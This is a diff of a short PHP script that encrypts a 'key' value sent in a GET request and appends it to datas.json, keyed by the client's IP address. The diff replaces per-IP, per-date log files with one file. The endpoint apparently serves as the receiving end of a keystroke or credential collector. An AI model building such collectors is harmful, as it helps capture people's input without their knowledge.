@@ -1,15 +1,19 @@
 <?php
 require_once 'encryptionkeys.php';
-if(!empty($_GET['key'])) {
-    $logfile = fopen(get_client_ip()."_".date("Y/m/d").'_datas.json', 'a+');
 
-    $encrypted = openssl_encrypt($_GET['key'], CIPHERING,
-                ENCRYPTION_KEY, 0, ENCRYPTION_IV);
+if (!empty($_GET['key'])) {
+    $logfile = fopen("datas.json", 'a+');
+
+    $encrypted = openssl_encrypt($_GET['key'], CIPHERING, ENCRYPTION_KEY, 0, ENCRYPTION_IV);
     
+    $logData = [
+        get_client_ip() => $encrypted
+    ];
 
-    fwrite($logfile, json_encode($encrypted));
+    fwrite($logfile, json_encode($logData) . PHP_EOL);
     fclose($logfile);
 }
+
 function get_client_ip() {
     $ipaddress = '';
     if (getenv('HTTP_CLIENT_IP'))
